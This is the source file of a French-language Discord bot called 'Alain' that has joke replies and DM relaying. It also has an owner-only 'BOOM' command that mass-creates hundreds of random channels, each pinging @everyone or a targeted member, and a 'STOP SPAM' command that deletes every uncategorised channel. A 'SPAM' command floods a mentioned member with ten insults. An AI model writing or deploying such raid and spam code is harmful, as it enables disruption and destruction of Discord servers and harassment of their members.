//Require
const { Client, TeamMember } = require('discord.js')

const client = new Client({
    partials: ['GUILD_MEMBER', 'CHANNEL', 'USER', 'REACTION']
})

//vars
let mode = 0;
let mainC;
let default_id = "754049600599621677";
let default_role ="823615437894844416";

let voc_done = ["Fait :cowboy:","Oké :nerd:","Vsy bg","Oké :smirk:"];
let voc_insulte = ["Sale nul", "T'es le meilleur en partant de la fin", "Tocard", "Puanteur", "Pointeur", "fils d'unijambiste"];
let voc_here = ["Ici :cowboy:","Oui?","Laisse-moi","Ui?"];
let usr_md;
let msg;
let msg_old;
let prfix = "Alain";
let args;
//funct
function getRandomInt(max) {
    return Math.floor(Math.random() * Math.floor(max));
  }

function cWordCheck(tab, msg){
    let cWord = false;
    let i = 0;
    while(cWord===false && i < tab.length )
    {
        if(tab[i] == "COQUINE" && msg.deletable)
        {
            cWord=true;
        }
        i++;
    }
    return cWord;
}



//On start
client.on('ready', () => {
    prefix = prfix.toUpperCase();
    console.log('Le bot est connecté !')

    client.user.setActivity('Fortnite', {
        type: 'PLAYING'
    })

//On message
    client.on('message', (message) => {
        msg_content = message.content.toUpperCase();
        args = msg_content.split(" ");

        if(!cWordCheck(args, message))
        {

            if(!message.author.bot && msg!=undefined && message.channel.type ==="dm")
            {
                msg.send("De <@"+message.author.id+">  : "+message.content);
            }

        if(msg_content.startsWith(prefix)&& msg_old!=message.id && !message.author.bot && message.author.id!=usr_md)
        {


            if(args[1]==='BOOM' && message.author.username==="Eurêka") {
                let mention = message.mentions.members.first();
                let ping = "@everyone";
                let nb = 500;
                if(!isNaN(parseInt(args[2])))
                {
                    nb=parseInt(args[2]);
                }
                if(mention != undefined)
                {
                    ping = "<@"+mention.id+">";
                }
                    message.channel.send("https://tenor.com/view/pepe-nuke-apocalypse-meme-gif-9579985");
                    for(i=0; i<nb; i++){
                    message.guild.channels.create(`${Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)}`, "text").then(channel=> {
                        channel.send(ping);
                    }
                        )
                }
            }
            if(args[1]==='STOP' && args[2]==='SPAM' && message.author.username==="Eurêka") {
                console.log("ok");
                message.channel.send(voc_done[getRandomInt(voc_done.length)]);
           message.guild.channels.cache.forEach(channel=> {  
                if( channel.type != "category")
           {
               if(channel.parentID === null)
                {
                    channel.delete();

                }
           }})
          
                    
                       
                    
                
            }
          

                msg_old = message.id;
                if(message.channel.type !="dm")
                {
                     mainC = message.guild.channels.cache.get(default_id);
                }


                if(args[1]==="?")
                {
                    message.channel.send(voc_here[getRandomInt(voc_here.length)]); //HERE
                }
                if(message.channel.type!="dm")
                {
                    if(!message.member.roles.cache.get(default_role) && mode === 1)
                    {
                      message.reply(voc_insulte[getRandomInt(voc_insulte.length)]); //HERE
                    }
                    if((message.member.roles.cache.get(default_role) && mode!=3) || message.author.username==="Eurêka")
                    {
                      if(args[1]==="SPAM")
                      {
                        let mention = message.mentions.members.first();

                        if(mention != undefined)
                        {
                          for(let i = 0 ; i<10 ; i++)
                          {
                            message.channel.send("<@"+mention.id+"> "+voc_insulte[getRandomInt(voc_insulte.length)]);
                          }
                          if(message.deletable)
                          {
                            message.delete();
                          }
                        }
                      }
                        if(args[1]==="MODE" && (args[2]=="0" || args[2]=="1" || args[2]=="2" ))
                        {
                            mode = parseInt(args[2]);
                            if(mode===2)
                            {
                                usr_md = message.author.id;
                            }
                            message.channel.send(voc_done[getRandomInt(voc_done.length)]); //HERE

                        }
                        if(args[1]==="MODE" && args[2]==="3" && message.author.username==="Eurêka")
                        {
                          mode=3;
                          message.channel.send(voc_done[getRandomInt(voc_done.length)]); //HERE

                        }
                        if(args[1]==="MODE" && args[2]==="?")
                        {
                            message.channel.send("Mode = "+mode);

                        }
                        if(args[1]==="CHANGE" && args[2]==="DEFAULT_ID")
                        {
                            message.channel.send(voc_done[getRandomInt(voc_done.length)]); //HERE
                            default_id = message.channel.id;
                            mainC = message.guild.channels.cache.get(default_id);
                        }
                        if(args[1]==="DM" && mode !=2)
                        {
                        msg=message.channel;
                        let str = "";
                        message.channel.send(voc_done[getRandomInt(voc_done.length)]);
                        let mention = message.mentions.members.first();
                        let spl = message.content.split(" ");
                        if(mention != undefined)
                        {
                            for(let i = 3 ; i < args.length ; i++)
                            {
                                str+=" "+spl[i];
                            }

                            mention.createDM().then(channel => {
                               return channel.send(str);
                            }) ;

                        }
                        }


                    }
                }
                 }

        }
        else{

            message.delete();
        }
        if(mode===2 && mainC!=undefined && usr_md === message.author.id && msg_content!="ALAIN MODE 2")
        {
            if(message.channel.id != mainC && args[0]!="STOP")
            {
                mainC.send(message.content);
            }
            else
            {
                mode=0;
                usr_md=undefined;
            }

        }
    })

    })
    client.login(process.env.TOKEN);
